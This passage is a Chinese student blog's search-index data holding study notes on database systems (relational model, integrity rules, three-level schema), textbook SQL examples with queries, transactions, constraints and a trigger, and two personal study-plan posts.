1.试述关系模型的三个组成部分\n关系数据结构：只包含单一的数据结构——关系，由三种类型：基本关系（基本表），查询表和视图表\n关系操作集合：查询（选择，投影，并，差，笛卡尔积），插入，删除，修改\n关系完整性约束\n2.关系数据语言的特点和分类\n(1)关系代数语言 (2)关系演算语言：元组关系演算语言和域关系演算语言 (3)SQL：具有关系代数和关系演算双重特点的语言\n3.解释术语，说明关系与联系\n（1）域：一组具有相同数据类型的值的集合\n（2）笛卡尔积：给定一组域D1,D2,\u0026hellip;,Dn,D1×D2×\u0026hellip;×Dn={(d1,d2,\u0026hellip;,dn),di∈Di}\n（3）关系：D1×D2×\u0026hellip;×Dn（笛卡尔积）的有限子集，表示为R（D1,D2,D3,\u0026hellip;,Dn），n=1，一元关系，n=2，二元关系，也是一张二维表\n（4）元组：笛卡尔积中每一个元素{(d1,d2,\u0026hellip;,dn),di∈Di}，一个n元组\n（5）属性：在二维表中，是一列，n目关系有n个属性（列）\n（1）主码：从多个候选码中选定一个作为主码\n（2）候选码：某一属性组的值额能唯一的标识一个元组，而其子集不能\n（3）外码：关系R中的一个属性F并不是R的码，但对应另一个关系S中的主码Ks，F称为R和S的外码，定义在同一个域上\n（1）关系模式（型）：关系的描述，R（U,D,DOM,F)，R为关系名，U为属性名集合，D为属性来自的域，DOM为属性向域的映像集合（如属性的类型，长度\n（2）关系（值）：包括基本关系（基本表），查询表，视图表\n（3）关系数据库：所有关系的集合\n4.举例说明关系模式和关系的联系\n关系是关系模型在某一时刻的状态或内容，关系模式是静态的，稳定的，关系是动态的，随时间不断变化的。\n5.试述关系模型的完整性规则。在参照完整性中，说明情况下外码属性的值可以为空值\n实体完整性：主属性不能去空值（null）\n参照完整性：两个关系之间存在着属性的引用，如学生的学号取值需要参照专业关系中的专业号\n用户定义的完整性：应用领域需要遵循的约束条件，语义约束\n在参照完整性规则中，外码属性的值可以取空值只有当外码的每个属性值取空值（二维表中每一列都是NULL）\n6.试述等值连接与自然连接的区别和联系\n自然连接是一种特殊的等值连接，，自然连接取消重复列\n7.关系代数的基本运算\n传统的集合运算：二目运算，包括并，差，交，笛卡尔积\n专门的关系运算：选择，投影，连接（查询就是一个关系在属性上的投影，取消某些列和重复元组），除运算\n","date":"2024-12-09T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E4%B9%A0%E9%A2%98%E7%AD%94%E6%A1%88/","title":"数据库系统概论第二章习题答案"},{"content":"第一章 绪论 1.试述数据，数据库，数据库管理系统，数据库系统的概念\n数据：描述事物的符号 数据库DB：长期储存在计算机内，有组织的，可共享的大量数据的集合。数据库中的数据按一定的数据模型组织，描述和储存，具有较小的冗余度，较高的数据独立性和易扩展性，并可为各种用户共享 数据库管理系统DBMS：系统软件，有以下功能： 数据定义 数据组织，存储和管理 数据操纵功能 数据库的事务管理和运行管理 数据库建立和维护 数据库系统DBS：由DB，DBMS,DA组成的存储，管理，处理和维护数据的系统 2.使用数据库有什么好处？\n数据结构化：整体和内部\n数据的共享性高，冗余度低且易扩展：大大减少数据冗余，节约存储空间，避免数据之间的不相容性与不一致性\n数据独立性高：\n物理独立性，用户的应用程序与数据库中数据库数据的物理存储相互独立 逻辑独立性：用户的应用程序与数据库的逻辑结构是相互独立 数据由数据库管理系统统一管理和控制\n数据的安全性保护：保护数据以防止不合法使用造成的数据泄密和破坏 数据的完整性检查：数据的正确性，有效性和相容性 用户可以并发控制 数据库恢复功能：比如说rollback 3.试述文件系统与数据库系统的区别和联系\n见P7表1.1\n6.数据库管理系统的主要功能\n在数据库建立，运用和维护时对数据库进行统一控制，以保证数据的完整性和安全性，并在多用户同时使用数据库时进行并发控制，在发生故障后对数据库进行恢复\n7.什么是概念模型？试述概念模型的作用\n信息模型，按用户的观点对数据和信息建模，主要用于数据库设计，用于信息世界的建模\n8.定义并解释概念模型中以下术语：\n实体：客观存在并可相互区别的事物。如具体的人，事，物，抽象的概念或联系\n实体型：用实体名及其属性名集合来抽象和刻画同类实体，如学生（学生号，姓名，性别，所在院系\u0026hellip;)\n实体集：同一类型实体的集合。例如，全体学生就是一个实体集\n实体之间的联系：或称不同实体集之间的联系\n9.试述数据模型的概念，数据模型的作用和数据模型的三个要素\n对现实世界数据特征的抽象，用来描述数据，组织数据和对数据进行操作\n比较真实地模拟现实世界 容易为人所理解 便于在计算机上实现 10.试述层次模型的概念，举出三个实例\n有且只有一个结点没有双亲结点（根节点），根以外的其他结点有且只有双亲结点，实例：行政结构，家族关系，生物分类学，电脑文件系统\n11.试述网状模型的概念，举出三个实例\n允许一个以上的结点无双亲，一个结点可以有多于一个的双亲，如互联网，社交网络，地铁交通网络\n12.试述层次，网状模型的优缺点\n层次模型的优点：\n数据结构简单清晰 数据库的查询效率高 层次数据模型提供了良好的完整性支持 层次模型的缺点：\n现实世界中很多联系是非层次性的 如果一个结点具有多个双亲结点等，不便于用层次模型表示联系 查询子女结点必须通过双亲结点 由于结构严密，层次命令趋于程序化 网状模型的优点：\n能够更为直接地描述现实世界，如一个结点可以有多个双亲，结点之间可以有多种联系 具有良好地性能，存取效率较高 网状模型的缺点：\n结构过程比较复杂 网状模型的DDL,DML复杂，需要嵌入语言 记录之间的联系通过存取路径实现，应用程序在访问数据时候必须选择适当的存取路径，用户必须了解系统结构的细节，加重了应用程序的负担 13.试述关系模型的概念，定义并解释以下术语\n关系模型由一组关系组成，每个关系的数据结构都是一张规范化的二维表。\n元组：表中的一行即为一个元组\n属性：表中的一列即为一个属性\n关系：一个关系对应以一张表\n码：某个可以唯一确定一个元组的属性组，如学生的学号\n域：一组具有相同数据类型的值的集合，如性别的域是{男，女}，大学生奈年龄属性的域是（15，45）\n分量：元组中的一个属性值\n14.试述关系数据库的特点\n规范化，即关系的每一个分量必须是一个不可分的数据项\n关系模型与格式化模型不同，建立在严格的数学概念的基础上\n概念单一，实体间的联系，对数据的检索和更新也是关系（Table），数据结构简单清晰\n存取路径透明，更高的数据独立性，更好的安全保密性，简化程序员的工作，但查询效率较低\n** 在计算机中，从某个角度*看不到的特性称该特性是透明的*。这个意义上的“透明”与社会生活中的透明含义*恰好相反*，例如计算机组织对程序员是透明的，就是说计算机组织对程序员来说是看不到的，也不需要看到的。*和汉语字典里面的意思不一样。 ***\n15，试述数据库系统的三级模式结构，并说明优点\n外模式，模式，内模式\n外模式：子模式或用户模式，数据库用户能够看见和使用的局部数据的逻辑结构和特征的描述，是数据库用户的数据视图，是与某一应用有关的数据的逻辑表示\n内模式：存储模式，数据物理结构和存储方式的描述，是数据在数据库内部的组织方式\n模式：逻辑模式，是数据库中全体数据的逻辑结构和特征的描述，是所有用户的公共数据视图，一个数据库只有一个模式\n使用户能够逻辑的，抽象的处理数据，而不必关心数据在计算机中的具体表示方式与存储方式\n17.什么叫数据与程序的物理独立性？数据与程序的逻辑独立性？为什么数据库由数据与程序的独立性？\n物理独立性：当数据库的存储结构改变时，由数据库管理员对模式/内模式映像作响应改变\n逻辑独立性：当模式改变时，由数据库管理员对各个外模式/模式的影响作相应改变，可以使外模式保持不变。应用程序是依据数据的外模式编写，从而应用程序不必修改，保证了数据与程序的逻辑独立性，简称数据的逻辑独立性。\n数据与程序之间的独立性使得数据的定义和描述可以从应用程序中分离出去。由于数据的存储由数据库管理系统管理，从而简化了应用程序的编制，大大减少了应用程序的维护和修改。\n18.试述数据库系统的组成\n数据库，数据库管理系统，应用程序和数据库管理员\n","date":"2024-12-09T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%B9%A0%E9%A2%98%E7%AD%94%E6%A1%88/","title":"数据库系统概论第一章习题答案"},{"content":" 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 SELECT RTRIM(vend_name) + \u0026#39;(\u0026#39;+ --右边取消空格 RTRIM(vend_country) + \u0026#39;)\u0026#39; AS vend_title From Vendors ORDER BY vend_name; SELECT prod_id,quantity,item_price,quantity*item_price AS expanded_price FROM OrderItems; SELECT vend_name,UPPER(vend_name) --大写 AS vend_name_upcase FROM Vendors ORDER BY vend_name; SELECT cust_name,cust_contact FROM Customers WHERE SOUNDEX(cust_contact) = SOUNDEX(\u0026#39;Michael Green\u0026#39;); --近似发音 SELECT order_num FROM Orders WHERE DATEPART(yy,order_date) = 2020; SELECT AVG(prod_price) AS avg_price --取平均值 FROM Products WHERE vend_id = \u0026#39;DLL01\u0026#39;; SELECT COUNT(*)AS num_cust --对所有行计数 FROM Customers; SELECT MAX(prod_price) AS max_price FROM Products; SELECT SUM(quantity*item_price) AS items_ordered FROM OrderItems WHERE order_num = 20005; SELECT AVG(DISTINCT prod_price) AS avg_price FROM Products Where vend_id =\u0026#39;DLL01\u0026#39;; SELECT COUNT(*) AS num_items,MIN(prod_price) AS price_min,MAX(prod_price) AS proce_max,AVG(prod_price) AS price_avg --组合聚集函数 FROM products; SELECT vend_id,COUNT(*) AS num_prods FROM Products Group BY vend_id HAVING COUNT(*) \u0026gt;= 2;--过滤分组，group by 和 having结合 SELECT order_num,COUNT(*)AS items FROM OrderItems Group BY order_num HAVING COUNT(*) \u0026gt;= 3--检索包含三个或更多物品的订单号和订购物品的数目 ORDER BY items,order_num;--按订购物品的数目排序输出，having在group by前，order by后 SELECT cust_id FROM OrderItems WHERE prod_id = \u0026#39;RGAN01\u0026#39;; SELECT cust_id FROM Orders WHERE order_num IN (20007,20008); SELECT cust_id FROM Orders WHERE order_num IN (SELECT cust_id FROM Orders WHERE order_num IN (20007,20008));--建立以上的子查询，由内向外 SELECT cust_name,cust_state,(SELECT COUNT(*)FROM Orders WHERE Orders.cust_id=Customers.cust_id) AS orders --子查询对检索出的每个顾客执行一次，用句点避免混淆列名 FROM Customers ORDER BY cust_name;--对于检索出的每个顾客，统计其在Orders表中的订单数目 SELECT vend_name,prod_name,prod_price FROM Vendors,Products WHERE Vendors.vend_id = Products.vend_id; BEGIN TRANSACTION DELETE OrderItems WHERE order_num =12345 SAVE TRANSACTION delete1;--使用保留点delete1，保留点越多越好，额能进行灵活的回退 DELETE Orders WHERE order_num =12345 ROLLBACK TRANSACTION delete1;--回退到保留点delete1 COMMIT TRANSACTION--控制事物处理，最后的commit仅在中间过程不出错的情况下写出更改 BEGIN TRANSACTION DELETE OrderItems WHERE order_num =12345 SAVE TRANSACTION delete1;--使用保留点delete1，保留点越多越好，额能进行灵活的回退 DELETE Orders WHERE order_num =12345 ROLLBACK TRANSACTION delete1;--回退到保留点delete1 COMMIT TRANSACTION--控制事物处理，最后的commit仅在中间过程不出错的情况下写出更改 DECLARE CURSOR CustCursor IS SELECT * FROM Customers WHERE cust_email IS NULL; ALTER TABLE Vendors ADD CONSTRAINT PRIMARY KEY(vend_id)--设置主键，DBMS默认主键基本不修改或更新，不能重用 ALTER TABLE Orders ADD CONSTRAINT FOREIGN KEY (cust_id) REFERENCES Customers(cust_id);--将此表中的cust_id设置为Customers的主键，即外键。外键有助防止意外删除，若删除，级联删除 CREATE INDEX prod_name_ind--索引名 ON Products(prod_name)--被索引的表，列 CREATE TRIGGER customer_state ON Customers FOR INSERT,UPDATE AS UPDATE Customers SET cust_state=Upper(cust_state) WHERE Customers.cust_id = inserted.cust_id;--创建一个触发器，对所有INSERT和UPDATE操作，将cust_state转为大写 ","date":"2024-12-05T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/sql%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A%E4%BE%8B%E5%AD%90/","title":"SQL必知必会例子"},{"content":"Python 爬虫 建模 数据挖掘（统计方向的待定） JS 做个代办事项列表（我所能想到JS对我的唯一用处就是网页加个响应什么的）\n重新巩固C语言 Unity 学习C#语言，可能大创写个游戏，或者跟之前联系好的设计系朋友写着玩玩\nLeetcode 刷题周赛 算法与数据结构 算是提前预习大三内容，以及体验下朋友所说的算法addiction\n","date":"2024-12-02T00:00:00Z","image":"https://Frederick2313072.github.io/p/plan-after-this-semester/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20241202170215_hu_f5523af80b8f11a1.jpg","permalink":"https://Frederick2313072.github.io/p/plan-after-this-semester/","title":"Plan after this semester"},{"content":"Python 基础语法到面向对象编程，小项目只用过pygame写了一个窗口射击游戏，图灵系列那本python编程学的很流畅，很快能上手项目\nJavascript 到现在只学了点皮毛，只会做动态内容更新，也只是自己做html网页时乱加上去的\nLinux 一开始甚至打算买个电脑重装Linux，看到无数人因为Linux整个大学没敲几行代码被劝退了，最后只学了Bash，但是和windows的shell不兼容，用的乌班图版本，以下是我试过的所有办法：\n虚拟盘开机和Windows双系统 虚拟机如virtualbox和Vmware（据说可以申请阿里云学生服务器，但我用的前者） Windows自带wsl，最后自己搞了个图形化界面，甚至现在偶尔还在用 工具 Vim：很容易上手，但不常用就会很快忘了（谁没事会在shell里面编辑文本） Nano：可读性比Vim强，但我已经习惯Vim了 SSH Docker Git：最重要的一个，不用多说 数据库 学校课程，但反而很不上心，明天开始重学\nCS常识 b站有个做的很好的科普视频，会放在Resource里面\nHtml 严格来说，太简单算不上编程语言\nCSS 之前自己做了个CSS模板，结果在运行cmd时被tailwind覆盖完了，没有git到远程仓库\u0026hellip;\u0026hellip;\n数学分析3，概率论 前者太难听不懂，后者太简单不想听\n","date":"2024-12-02T00:00:00Z","image":"https://Frederick2313072.github.io/p/summary-in-november/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20241202225640_hu_95a0bebc19439f13.jpg","permalink":"https://Frederick2313072.github.io/p/summary-in-november/","title":"Summary in November"},{"content":"第三章 SQL 1.试述SQL的特点\n综合统一，高度非过程化，面向集合的操作方式，以同一种语法结构提供多种使用方式\n2.说明在DROP TABLE时，RESTRICT和CASCADE的区别\n","date":"0001-01-01T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/","title":""}]